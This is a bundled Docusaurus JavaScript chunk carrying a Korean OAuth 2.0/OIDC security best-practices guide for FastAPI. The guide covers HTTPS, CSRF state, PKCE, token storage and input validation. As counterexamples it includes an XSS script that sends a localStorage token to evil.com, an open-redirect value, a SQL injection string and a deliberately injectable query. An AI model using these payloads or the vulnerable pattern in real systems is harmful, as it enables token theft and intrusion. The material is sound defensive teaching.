"use strict";(globalThis.webpackChunkgithub_docs=globalThis.webpackChunkgithub_docs||[]).push([[3465],{2094:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>u,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"oauth/advanced/security","title":"\ubcf4\uc548 Best Practices","description":"OAuth 2.0 / OIDC \uad6c\ud604 \uc2dc \ubc18\ub4dc\uc2dc \uc9c0\ucf1c\uc57c \ud560 \ubcf4\uc548 \uc6d0\uce59\uacfc \uc2e4\uc804 \uac00\uc774\ub4dc\uc785\ub2c8\ub2e4.","source":"@site/docs/oauth/advanced/security.md","sourceDirName":"oauth/advanced","slug":"/oauth/advanced/security","permalink":"/tobias-docs/comp-1/docs/oauth/advanced/security","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/oauth/advanced/security.md","tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"sidebar_position":2},"sidebar":"oauthSidebar","previous":{"title":"PKCE \uad6c\ud604","permalink":"/tobias-docs/comp-1/docs/oauth/advanced/pkce"},"next":{"title":"\ud1a0\ud070 \uad00\ub9ac","permalink":"/tobias-docs/comp-1/docs/oauth/advanced/token-management"}}');var r=t(4848),i=t(8453);const a={sidebar_position:2},o="\ubcf4\uc548 Best Practices",c={},l=[{value:"\ud83c\udfaf \ubaa9\ud45c",id:"-\ubaa9\ud45c",level:2},{value:"\ud83d\udd12 \ud575\uc2ec \ubcf4\uc548 \uc6d0\uce59",id:"-\ud575\uc2ec-\ubcf4\uc548-\uc6d0\uce59",level:2},{value:"1. HTTPS \ud544\uc218",id:"1-https-\ud544\uc218",level:3},{value:"2. State Parameter (CSRF \ubc29\uc9c0)",id:"2-state-parameter-csrf-\ubc29\uc9c0",level:3},{value:"3. PKCE (\ubaa8\ub4e0 \ud074\ub77c\uc774\uc5b8\ud2b8)",id:"3-pkce-\ubaa8\ub4e0-\ud074\ub77c\uc774\uc5b8\ud2b8",level:3},{value:"4. Redirect URI \uac80\uc99d",id:"4-redirect-uri-\uac80\uc99d",level:3},{value:"\ud83d\udee1\ufe0f \ud1a0\ud070 \ubcf4\uc548",id:"\ufe0f-\ud1a0\ud070-\ubcf4\uc548",level:2},{value:"1. \uc9e7\uc740 Access Token \uc218\uba85",id:"1-\uc9e7\uc740-access-token-\uc218\uba85",level:3},{value:"2. \uc548\uc804\ud55c \ud1a0\ud070 \uc800\uc7a5",id:"2-\uc548\uc804\ud55c-\ud1a0\ud070-\uc800\uc7a5",level:3},{value:"3. Refresh Token \ubcf4\ud638",id:"3-refresh-token-\ubcf4\ud638",level:3},{value:"4. \ud1a0\ud070 \ud3d0\uae30 (Revocation)",id:"4-\ud1a0\ud070-\ud3d0\uae30-revocation",level:3},{value:"\ud83d\udd10 \ube44\ubc00\ud0a4 \uad00\ub9ac",id:"-\ube44\ubc00\ud0a4-\uad00\ub9ac",level:2},{value:"1. \uac15\ub825\ud55c \ube44\ubc00\ud0a4 \uc0dd\uc131",id:"1-\uac15\ub825\ud55c-\ube44\ubc00\ud0a4-\uc0dd\uc131",level:3},{value:"2. \ud658\uacbd\ubcc0\uc218 \uc0ac\uc6a9",id:"2-\ud658\uacbd\ubcc0\uc218-\uc0ac\uc6a9",level:3},{value:"3. Secrets \uad00\ub9ac \uc2dc\uc2a4\ud15c",id:"3-secrets-\uad00\ub9ac-\uc2dc\uc2a4\ud15c",level:3},{value:"\ud83d\udee1\ufe0f \uc785\ub825 \uac80\uc99d",id:"\ufe0f-\uc785\ub825-\uac80\uc99d",level:2},{value:"1. OAuth \ud30c\ub77c\ubbf8\ud130 \uac80\uc99d",id:"1-oauth-\ud30c\ub77c\ubbf8\ud130-\uac80\uc99d",level:3},{value:"2. SQL Injection \ubc29\uc9c0",id:"2-sql-injection-\ubc29\uc9c0",level:3},{value:"3. XSS \ubc29\uc9c0",id:"3-xss-\ubc29\uc9c0",level:3},{value:"\ud83d\udd12 Rate Limiting",id:"-rate-limiting",level:2},{value:"1. FastAPI Rate Limiting",id:"1-fastapi-rate-limiting",level:3},{value:"2. Redis\ub85c Rate Limiting",id:"2-redis\ub85c-rate-limiting",level:3},{value:"\ud83e\uddea \ubcf4\uc548 \ud14c\uc2a4\ud2b8",id:"-\ubcf4\uc548-\ud14c\uc2a4\ud2b8",level:2},{value:"1. CSRF \ud14c\uc2a4\ud2b8",id:"1-csrf-\ud14c\uc2a4\ud2b8",level:3},{value:"2. PKCE \ud14c\uc2a4\ud2b8",id:"2-pkce-\ud14c\uc2a4\ud2b8",level:3},{value:"3. \ud1a0\ud070 \ub9cc\ub8cc \ud14c\uc2a4\ud2b8",id:"3-\ud1a0\ud070-\ub9cc\ub8cc-\ud14c\uc2a4\ud2b8",level:3},{value:"\ud83d\udccb \ud504\ub85c\ub355\uc158 \uccb4\ud06c\ub9ac\uc2a4\ud2b8",id:"-\ud504\ub85c\ub355\uc158-\uccb4\ud06c\ub9ac\uc2a4\ud2b8",level:2},{value:"\ud83d\udd17 \uad00\ub828 \ubb38\uc11c",id:"-\uad00\ub828-\ubb38\uc11c",level:2},{value:"\ud83c\udfaf \ub2e4\uc74c \ub2e8\uacc4",id:"-\ub2e4\uc74c-\ub2e8\uacc4",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"\ubcf4\uc548-best-practices",children:"\ubcf4\uc548 Best Practices"})}),"\n",(0,r.jsx)(n.p,{children:"OAuth 2.0 / OIDC \uad6c\ud604 \uc2dc \ubc18\ub4dc\uc2dc \uc9c0\ucf1c\uc57c \ud560 \ubcf4\uc548 \uc6d0\uce59\uacfc \uc2e4\uc804 \uac00\uc774\ub4dc\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(n.h2,{id:"-\ubaa9\ud45c",children:"\ud83c\udfaf \ubaa9\ud45c"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u2705 OWASP \ubcf4\uc548 \uac00\uc774\ub4dc \uc900\uc218"}),"\n",(0,r.jsx)(n.li,{children:"\u2705 \uc77c\ubc18\uc801\uc778 \uacf5\uaca9 \ubca1\ud130 \uc774\ud574"}),"\n",(0,r.jsx)(n.li,{children:"\u2705 FastAPI \ubcf4\uc548 \ud328\ud134"}),"\n",(0,r.jsx)(n.li,{children:"\u2705 \ud504\ub85c\ub355\uc158 \uccb4\ud06c\ub9ac\uc2a4\ud2b8"}),"\n",(0,r.jsx)(n.li,{children:"\u2705 \ubcf4\uc548 \ud14c\uc2a4\ud2b8"}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"-\ud575\uc2ec-\ubcf4\uc548-\uc6d0\uce59",children:"\ud83d\udd12 \ud575\uc2ec \ubcf4\uc548 \uc6d0\uce59"}),"\n",(0,r.jsx)(n.h3,{id:"1-https-\ud544\uc218",children:"1. HTTPS \ud544\uc218"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u274c HTTP (\uc808\ub300 \uc0ac\uc6a9 \uae08\uc9c0)\nBASE_URL = "http://example.com"\n\n# \u2705 HTTPS (\ud544\uc218)\nBASE_URL = "https://example.com"\n\n# FastAPI\uc5d0\uc11c HTTPS \uac15\uc81c\nfrom fastapi import Request, HTTPException\n\nasync def require_https(request: Request):\n    """HTTPS \uc694\uad6c"""\n    if request.url.scheme != "https" and not request.url.hostname in ["localhost", "127.0.0.1"]:\n        raise HTTPException(\n            status_code=403,\n            detail="HTTPS required"\n        )\n\n# \ubbf8\ub4e4\uc6e8\uc5b4\ub85c \uc801\uc6a9\nfrom starlette.middleware.base import BaseHTTPMiddleware\n\nclass HTTPSRedirectMiddleware(BaseHTTPMiddleware):\n    async def dispatch(self, request, call_next):\n        if request.url.scheme == "http" and request.url.hostname not in ["localhost", "127.0.0.1"]:\n            url = request.url.replace(scheme="https")\n            return RedirectResponse(url, status_code=301)\n\n        return await call_next(request)\n\napp.add_middleware(HTTPSRedirectMiddleware)\n\n# \uc65c HTTPS?\nwhy_https = {\n    "\uc554\ud638\ud654": "\ud1b5\uc2e0 \ub0b4\uc6a9 \ubcf4\ud638",\n    "\ubb34\uacb0\uc131": "\ub370\uc774\ud130 \ubcc0\uc870 \ubc29\uc9c0",\n    "\uc778\uc99d": "\uc11c\ubc84 \uc2e0\uc6d0 \ud655\uc778",\n    "\ud1a0\ud070 \ubcf4\ud638": "Access Token, Authorization Code \ubcf4\ud638"\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"2-state-parameter-csrf-\ubc29\uc9c0",children:"2. State Parameter (CSRF \ubc29\uc9c0)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import secrets\n\n# \u2705 \ud56d\uc0c1 State \uc0ac\uc6a9\n@app.get(\'/login\')\nasync def login(request: Request):\n    """State\ub85c CSRF \ubc29\uc9c0"""\n\n    # 1. State \uc0dd\uc131\n    state = secrets.token_urlsafe(32)\n\n    # 2. \uc138\uc158\uc5d0 \uc800\uc7a5\n    request.session[\'oauth_state\'] = state\n\n    # 3. Authorization Request\uc5d0 \ud3ec\ud568\n    auth_url = f"...&state={state}"\n\n    return RedirectResponse(auth_url)\n\n@app.get(\'/callback\')\nasync def callback(request: Request):\n    """State \uac80\uc99d"""\n\n    # 1. State \uac00\uc838\uc624\uae30\n    received_state = request.query_params.get(\'state\')\n    saved_state = request.session.pop(\'oauth_state\', None)\n\n    # 2. \uac80\uc99d\n    if not received_state or received_state != saved_state:\n        raise HTTPException(\n            status_code=400,\n            detail="Invalid state - possible CSRF attack"\n        )\n\n    # ... Token \uad50\ud658\n\n# CSRF \uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624 (State \uc5c6\uc744 \ub54c)\ncsrf_attack = {\n    "1. \uacf5\uaca9\uc790": "\uc545\uc758\uc801 Authorization URL \uc0dd\uc131",\n    "2. \ud53c\ud574\uc790": "\ub9c1\ud06c \ud074\ub9ad \u2192 \uacf5\uaca9\uc790 \uacc4\uc815\uc73c\ub85c \ub85c\uadf8\uc778",\n    "3. \uacb0\uacfc": "\ud53c\ud574\uc790\uc758 \ub370\uc774\ud130\uac00 \uacf5\uaca9\uc790 \uacc4\uc815\uc5d0 \uc800\uc7a5\ub428",\n    "4. \ubc29\uc5b4": "State \ud30c\ub77c\ubbf8\ud130\ub85c \uc694\uccad \ucd9c\ucc98 \uac80\uc99d"\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"3-pkce-\ubaa8\ub4e0-\ud074\ub77c\uc774\uc5b8\ud2b8",children:"3. PKCE (\ubaa8\ub4e0 \ud074\ub77c\uc774\uc5b8\ud2b8)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u2705 OAuth 2.1: \ubaa8\ub4e0 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0 PKCE \ud544\uc218\n\n# Confidential Client (\uc11c\ubc84 \uc571)\nconfidential_flow = {\n    "Client Secret": "\u2705 \uc788\uc74c",\n    "PKCE": "\u2705 \uad8c\uc7a5 (\uc774\uc911 \ubcf4\ud638)",\n    "\ubcf4\uc548": "\ub9e4\uc6b0 \ub192\uc74c"\n}\n\n# Public Client (SPA, \ubaa8\ubc14\uc77c)\npublic_flow = {\n    "Client Secret": "\u274c \uc5c6\uc74c",\n    "PKCE": "\u2705 \ud544\uc218",\n    "\ubcf4\uc548": "PKCE\ub85c \ubcf4\ud638"\n}\n\n# PKCE \uad6c\ud604\nimport hashlib\nimport base64\n\ndef generate_pkce():\n    """PKCE Code Verifier + Challenge"""\n    code_verifier = secrets.token_urlsafe(32)\n\n    digest = hashlib.sha256(code_verifier.encode()).digest()\n    code_challenge = base64.urlsafe_b64encode(digest).decode().rstrip(\'=\')\n\n    return code_verifier, code_challenge\n\n# \uc0ac\uc6a9\ncode_verifier, code_challenge = generate_pkce()\nrequest.session[\'code_verifier\'] = code_verifier\n\n# Authorization Request\nauth_url = f"...&code_challenge={code_challenge}&code_challenge_method=S256"\n'})}),"\n",(0,r.jsx)(n.h3,{id:"4-redirect-uri-\uac80\uc99d",children:"4. Redirect URI \uac80\uc99d"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u2705 \ub4f1\ub85d\ub41c URI\ub9cc \ud5c8\uc6a9\n\nALLOWED_REDIRECT_URIS = [\n    "https://myapp.com/callback",\n    "https://myapp.com/auth/google/callback",\n    "http://localhost:8000/callback"  # \uac1c\ubc1c\uc6a9\n]\n\ndef validate_redirect_uri(redirect_uri: str) -> bool:\n    """Redirect URI \uac80\uc99d"""\n    return redirect_uri in ALLOWED_REDIRECT_URIS\n\n# Authorization Server \uad6c\ud604\n@app.get(\'/authorize\')\nasync def authorize(redirect_uri: str):\n    """Authorization Endpoint"""\n\n    # Redirect URI \uac80\uc99d\n    if not validate_redirect_uri(redirect_uri):\n        raise HTTPException(\n            status_code=400,\n            detail="Invalid redirect_uri"\n        )\n\n    # ...\n\n# \uc624\ud508 \ub9ac\ub2e4\uc774\ub809\ud2b8 \uacf5\uaca9 \ubc29\uc9c0\nopen_redirect_attack = {\n    "\uacf5\uaca9": "redirect_uri=https://evil.com",\n    "\uacb0\uacfc": "Authorization Code\uac00 \uacf5\uaca9\uc790\uc5d0\uac8c \uc804\uc1a1",\n    "\ubc29\uc5b4": "\ub4f1\ub85d\ub41c URI\ub9cc \ud5c8\uc6a9"\n}\n\n# \u26a0\ufe0f \uc8fc\uc758: \uc815\ud655\ud55c \uc77c\uce58 \ud544\uc694\n# \u2705 https://myapp.com/callback\n# \u274c https://myapp.com/callback?extra=param\n# \u274c https://myapp.com/callback#fragment\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\ufe0f-\ud1a0\ud070-\ubcf4\uc548",children:"\ud83d\udee1\ufe0f \ud1a0\ud070 \ubcf4\uc548"}),"\n",(0,r.jsx)(n.h3,{id:"1-\uc9e7\uc740-access-token-\uc218\uba85",children:"1. \uc9e7\uc740 Access Token \uc218\uba85"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u2705 \uad8c\uc7a5 \uc218\uba85\nTOKEN_LIFETIMES = {\n    "Access Token": "15-30\ubd84",\n    "Refresh Token": "7-30\uc77c",\n    "ID Token": "Access Token\uacfc \ub3d9\uc77c",\n    "Authorization Code": "10\ubd84"\n}\n\n# \uc124\uc815\nACCESS_TOKEN_EXPIRE_MINUTES = 15\nREFRESH_TOKEN_EXPIRE_DAYS = 7\n\nfrom datetime import timedelta\n\ndef create_access_token(data: dict):\n    """\uc9e7\uc740 \uc218\uba85\uc758 Access Token"""\n    to_encode = data.copy()\n    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)\n    to_encode.update({"exp": expire})\n\n    return jwt.encode(to_encode, SECRET_KEY, algorithm="HS256")\n\n# \uc65c \uc9e7\uc740 \uc218\uba85?\nwhy_short_lifetime = {\n    "\ud0c8\ucde8 \uc2dc \ud53c\ud574 \ucd5c\uc18c\ud654": "15\ubd84\ub9cc \uc720\ud6a8",\n    "Refresh Token\uc73c\ub85c \uac31\uc2e0": "\uc0ac\uc6a9\uc790 \uc7ac\ub85c\uadf8\uc778 \ubd88\ud544\uc694",\n    "\ubcf4\uc548 \uac15\ud654": "\ube48\ubc88\ud55c \uac31\uc2e0\uc73c\ub85c \ub9ac\uc2a4\ud06c \uac10\uc18c"\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"2-\uc548\uc804\ud55c-\ud1a0\ud070-\uc800\uc7a5",children:"2. \uc548\uc804\ud55c \ud1a0\ud070 \uc800\uc7a5"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u2705 \uc11c\ubc84 \uce21 (\uad8c\uc7a5)\n# - \uc554\ud638\ud654\ub41c \ub370\uc774\ud130\ubca0\uc774\uc2a4\n# - \uba54\ubaa8\ub9ac \uce90\uc2dc (Redis with encryption)\n# - Secure \uc138\uc158\n\n# \u2705 \ube0c\ub77c\uc6b0\uc800 (\ud074\ub77c\uc774\uc5b8\ud2b8)\n# - HttpOnly Cookie (XSS \ubc29\uc9c0)\n# - Secure flag (HTTPS\ub9cc)\n# - SameSite flag (CSRF \ubc29\uc9c0)\n\nfrom fastapi import Response\n\ndef set_token_cookie(response: Response, access_token: str):\n    """\uc548\uc804\ud55c \ucfe0\ud0a4 \uc124\uc815"""\n    response.set_cookie(\n        key="access_token",\n        value=access_token,\n        httponly=True,    # \u2705 JavaScript \uc811\uadfc \ubd88\uac00\n        secure=True,      # \u2705 HTTPS\ub9cc\n        samesite=\'lax\',   # \u2705 CSRF \ubc29\uc9c0\n        max_age=900,      # 15\ubd84\n        path="/"\n    )\n\n# \u274c \uc704\ud5d8\ud55c \uc800\uc7a5\ndangerous_storage = {\n    "LocalStorage": "\u274c XSS \uacf5\uaca9\uc5d0 \ucde8\uc57d",\n    "SessionStorage": "\u274c XSS \uacf5\uaca9\uc5d0 \ucde8\uc57d",\n    "URL \ud30c\ub77c\ubbf8\ud130": "\u274c \ub85c\uadf8, \ube0c\ub77c\uc6b0\uc800 \ud788\uc2a4\ud1a0\ub9ac\uc5d0 \ub178\ucd9c",\n    "\ud3c9\ubb38 \ucfe0\ud0a4": "\u274c JavaScript\ub85c \uc811\uadfc \uac00\ub2a5"\n}\n\n# XSS \uacf5\uaca9 \uc608\nxss_attack = """\n<script>\n// \uacf5\uaca9\uc790\uac00 \uc8fc\uc785\ud55c \uc2a4\ud06c\ub9bd\ud2b8\nconst token = localStorage.getItem(\'access_token\');\nfetch(\'https://evil.com/steal?token=\' + token);\n<\/script>\n"""\n'})}),"\n",(0,r.jsx)(n.h3,{id:"3-refresh-token-\ubcf4\ud638",children:"3. Refresh Token \ubcf4\ud638"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Refresh Token\uc740 \ub354 \uc5c4\uaca9\ud558\uac8c \ubcf4\ud638\n\n# \u2705 Refresh Token \uc800\uc7a5\n# - \uc554\ud638\ud654\ub41c DB (\ud574\uc2dc \uc800\uc7a5 \uad8c\uc7a5)\n# - HttpOnly Cookie (\ube0c\ub77c\uc6b0\uc800)\n# - Secure Storage (\ubaa8\ubc14\uc77c)\n\nfrom passlib.context import CryptContext\n\npwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")\n\ndef store_refresh_token(user_id: str, refresh_token: str):\n    """Refresh Token \ud574\uc2dc \uc800\uc7a5"""\n\n    # Refresh Token \ud574\uc2dc\n    token_hash = pwd_context.hash(refresh_token)\n\n    # DB \uc800\uc7a5\n    db.execute(\n        "INSERT INTO refresh_tokens (user_id, token_hash, created_at) VALUES (?, ?, ?)",\n        (user_id, token_hash, datetime.utcnow())\n    )\n\ndef verify_refresh_token(user_id: str, refresh_token: str) -> bool:\n    """Refresh Token \uac80\uc99d"""\n\n    # DB\uc5d0\uc11c \ud574\uc2dc \uac00\uc838\uc624\uae30\n    result = db.execute(\n        "SELECT token_hash FROM refresh_tokens WHERE user_id = ?",\n        (user_id,)\n    ).fetchone()\n\n    if not result:\n        return False\n\n    # \ud574\uc2dc \ube44\uad50\n    return pwd_context.verify(refresh_token, result[0])\n\n# Refresh Token Rotation\ndef rotate_refresh_token(old_token: str) -> str:\n    """Refresh Token \uc21c\ud658"""\n\n    # \uc0c8 Refresh Token \uc0dd\uc131\n    new_token = create_refresh_token(...)\n\n    # \uc774\uc804 \ud1a0\ud070 \ubb34\ud6a8\ud654\n    revoke_refresh_token(old_token)\n\n    return new_token\n'})}),"\n",(0,r.jsx)(n.h3,{id:"4-\ud1a0\ud070-\ud3d0\uae30-revocation",children:"4. \ud1a0\ud070 \ud3d0\uae30 (Revocation)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Redis\ub85c \ud1a0\ud070 \ube14\ub799\ub9ac\uc2a4\ud2b8 \uad6c\ud604\n\nimport redis\n\nredis_client = redis.Redis(host=\'localhost\', port=6379, db=0)\n\ndef revoke_token(token: str, expires_in: int):\n    """\ud1a0\ud070 \ud3d0\uae30"""\n\n    # Redis\uc5d0 \ube14\ub799\ub9ac\uc2a4\ud2b8 \uc800\uc7a5 (TTL \uc124\uc815)\n    redis_client.setex(\n        f"revoked:token:{token}",\n        expires_in,  # TTL (\ub0a8\uc740 \ub9cc\ub8cc \uc2dc\uac04)\n        "1"\n    )\n\ndef is_token_revoked(token: str) -> bool:\n    """\ud1a0\ud070 \ud3d0\uae30 \ud655\uc778"""\n    return redis_client.exists(f"revoked:token:{token}") > 0\n\n# \uc758\uc874\uc131\uc73c\ub85c \uc0ac\uc6a9\nasync def get_current_user(token: str = Depends(oauth2_scheme)):\n    """\ube14\ub799\ub9ac\uc2a4\ud2b8 \ud655\uc778 \ud3ec\ud568"""\n\n    # \ud3d0\uae30 \ud655\uc778\n    if is_token_revoked(token):\n        raise HTTPException(\n            status_code=401,\n            detail="Token has been revoked"\n        )\n\n    # \uc77c\ubc18 \uac80\uc99d\n    payload = verify_token(token)\n    return payload\n\n# \ub85c\uadf8\uc544\uc6c3\n@app.post(\'/logout\')\nasync def logout(token: str = Depends(oauth2_scheme)):\n    """\ub85c\uadf8\uc544\uc6c3 (\ud1a0\ud070 \ud3d0\uae30)"""\n\n    # Token \ub514\ucf54\ub529 (\uac80\uc99d \uc5c6\uc774)\n    payload = jwt.decode(token, options={"verify_signature": False})\n    exp = payload[\'exp\']\n    now = datetime.utcnow().timestamp()\n\n    # \ub0a8\uc740 \uc2dc\uac04\n    expires_in = int(exp - now)\n\n    if expires_in > 0:\n        revoke_token(token, expires_in)\n\n    return {"message": "Logged out successfully"}\n'})}),"\n",(0,r.jsx)(n.h2,{id:"-\ube44\ubc00\ud0a4-\uad00\ub9ac",children:"\ud83d\udd10 \ube44\ubc00\ud0a4 \uad00\ub9ac"}),"\n",(0,r.jsx)(n.h3,{id:"1-\uac15\ub825\ud55c-\ube44\ubc00\ud0a4-\uc0dd\uc131",children:"1. \uac15\ub825\ud55c \ube44\ubc00\ud0a4 \uc0dd\uc131"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import secrets\n\n# \u2705 \uac15\ub825\ud55c \ube44\ubc00\ud0a4 \uc0dd\uc131\nSECRET_KEY = secrets.token_urlsafe(32)  # 256 bits\n\n# \uba85\ub839\uc904\uc5d0\uc11c \uc0dd\uc131\n# python -c "import secrets; print(secrets.token_urlsafe(32))"\n\n# \u274c \uc57d\ud55c \ube44\ubc00\ud0a4\nSECRET_KEY = "my-secret"  # \uc808\ub300 \uc0ac\uc6a9 \uae08\uc9c0!\n'})}),"\n",(0,r.jsx)(n.h3,{id:"2-\ud658\uacbd\ubcc0\uc218-\uc0ac\uc6a9",children:"2. \ud658\uacbd\ubcc0\uc218 \uc0ac\uc6a9"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u2705 \ud658\uacbd\ubcc0\uc218\ub85c \uad00\ub9ac\nimport os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nSECRET_KEY = os.getenv("JWT_SECRET_KEY")\nGOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")\n\n# .env \ud30c\uc77c\n"""\nJWT_SECRET_KEY=your-generated-secret-key\nGOOGLE_CLIENT_SECRET=your-google-client-secret\n"""\n\n# .gitignore\uc5d0 \ucd94\uac00\n"""\n.env\n.env.local\n.env.production\n"""\n\n# \u274c \ucf54\ub4dc\uc5d0 \ud558\ub4dc\ucf54\ub529\nSECRET_KEY = "abc123"  # Git\uc5d0 \ucee4\ubc0b\ub418\uba74 \ub178\ucd9c!\n'})}),"\n",(0,r.jsx)(n.h3,{id:"3-secrets-\uad00\ub9ac-\uc2dc\uc2a4\ud15c",children:"3. Secrets \uad00\ub9ac \uc2dc\uc2a4\ud15c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"# \ud504\ub85c\ub355\uc158\uc5d0\uc11c\ub294 \uc804\ubb38 Secrets \uad00\ub9ac \uc2dc\uc2a4\ud15c \uc0ac\uc6a9\n\n# AWS Secrets Manager\nimport boto3\n\ndef get_secret(secret_name):\n    client = boto3.client('secretsmanager', region_name='us-east-1')\n    response = client.get_secret_value(SecretId=secret_name)\n    return json.loads(response['SecretString'])\n\nsecrets = get_secret('prod/oauth/secrets')\nSECRET_KEY = secrets['jwt_secret_key']\n\n# HashiCorp Vault\nimport hvac\n\nclient = hvac.Client(url='https://vault.example.com')\nclient.token = os.getenv('VAULT_TOKEN')\n\nsecret = client.secrets.kv.v2.read_secret_version(path='oauth/secrets')\nSECRET_KEY = secret['data']['data']['jwt_secret_key']\n\n# Google Cloud Secret Manager\nfrom google.cloud import secretmanager\n\nclient = secretmanager.SecretManagerServiceClient()\nname = \"projects/PROJECT_ID/secrets/jwt-secret-key/versions/latest\"\nresponse = client.access_secret_version(request={\"name\": name})\nSECRET_KEY = response.payload.data.decode(\"UTF-8\")\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\ufe0f-\uc785\ub825-\uac80\uc99d",children:"\ud83d\udee1\ufe0f \uc785\ub825 \uac80\uc99d"}),"\n",(0,r.jsx)(n.h3,{id:"1-oauth-\ud30c\ub77c\ubbf8\ud130-\uac80\uc99d",children:"1. OAuth \ud30c\ub77c\ubbf8\ud130 \uac80\uc99d"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pydantic import BaseModel, validator, HttpUrl\n\nclass AuthorizationRequest(BaseModel):\n    """Authorization Request \uac80\uc99d"""\n\n    client_id: str\n    redirect_uri: HttpUrl  # URL \ud615\uc2dd \uac80\uc99d\n    response_type: str\n    scope: str\n    state: str\n\n    @validator(\'response_type\')\n    def validate_response_type(cls, v):\n        """response_type \uac80\uc99d"""\n        allowed = [\'code\', \'token\', \'id_token\']\n        if v not in allowed:\n            raise ValueError(f\'Invalid response_type: {v}\')\n        return v\n\n    @validator(\'scope\')\n    def validate_scope(cls, v):\n        """scope \uac80\uc99d"""\n        allowed_scopes = {\'openid\', \'email\', \'profile\', \'offline_access\'}\n        requested = set(v.split())\n\n        if not requested.issubset(allowed_scopes):\n            invalid = requested - allowed_scopes\n            raise ValueError(f\'Invalid scopes: {invalid}\')\n\n        return v\n\n    @validator(\'state\')\n    def validate_state(cls, v):\n        """state \ucd5c\uc18c \uae38\uc774 \uac80\uc99d"""\n        if len(v) < 32:\n            raise ValueError(\'State too short\')\n        return v\n\n# \uc0ac\uc6a9\n@app.get(\'/authorize\')\nasync def authorize(\n    client_id: str,\n    redirect_uri: str,\n    response_type: str,\n    scope: str,\n    state: str\n):\n    """\uac80\uc99d\ub41c Authorization Request"""\n\n    # Pydantic\uc73c\ub85c \uac80\uc99d\n    try:\n        request = AuthorizationRequest(\n            client_id=client_id,\n            redirect_uri=redirect_uri,\n            response_type=response_type,\n            scope=scope,\n            state=state\n        )\n    except ValueError as e:\n        raise HTTPException(status_code=400, detail=str(e))\n\n    # ...\n'})}),"\n",(0,r.jsx)(n.h3,{id:"2-sql-injection-\ubc29\uc9c0",children:"2. SQL Injection \ubc29\uc9c0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# \u2705 Parameterized Queries\ndef get_user_by_id(user_id: str):\n    """\uc548\uc804\ud55c \ucffc\ub9ac"""\n    cursor.execute(\n        "SELECT * FROM users WHERE id = ?",\n        (user_id,)  # \ud30c\ub77c\ubbf8\ud130\ud654\n    )\n    return cursor.fetchone()\n\n# \u274c SQL Injection \ucde8\uc57d\ndef get_user_by_id_unsafe(user_id: str):\n    """\uc704\ud5d8\ud55c \ucffc\ub9ac"""\n    cursor.execute(\n        f"SELECT * FROM users WHERE id = \'{user_id}\'"  # \ubb38\uc790\uc5f4 \uc5f0\uacb0\n    )\n    # user_id = "1\' OR \'1\'=\'1" \u2192 \ubaa8\ub4e0 \uc0ac\uc6a9\uc790 \uc870\ud68c!\n'})}),"\n",(0,r.jsx)(n.h3,{id:"3-xss-\ubc29\uc9c0",children:"3. XSS \ubc29\uc9c0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from fastapi.responses import HTMLResponse\nfrom markupsafe import escape\n\n@app.get(\'/profile\', response_class=HTMLResponse)\nasync def profile(request: Request):\n    """XSS \ubc29\uc9c0"""\n\n    user = request.session.get(\'user\')\n\n    # \u2705 \uc774\uc2a4\ucf00\uc774\ud504 \ucc98\ub9ac\n    safe_name = escape(user[\'name\'])\n\n    return f"""\n    <html>\n        <body>\n            <h1>Welcome, {safe_name}!</h1>\n        </body>\n    </html>\n    """\n\n# \u274c XSS \ucde8\uc57d\n# user[\'name\'] = "<script>alert(\'XSS\')<\/script>"\n# \u2192 \uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589\ub428!\n\n# \u2705 \ud15c\ud50c\ub9bf \uc5d4\uc9c4 \uc0ac\uc6a9 (\uc790\ub3d9 \uc774\uc2a4\ucf00\uc774\ud504)\nfrom fastapi.templating import Jinja2Templates\n\ntemplates = Jinja2Templates(directory="templates")\n\n@app.get(\'/profile\')\nasync def profile(request: Request):\n    user = request.session.get(\'user\')\n\n    return 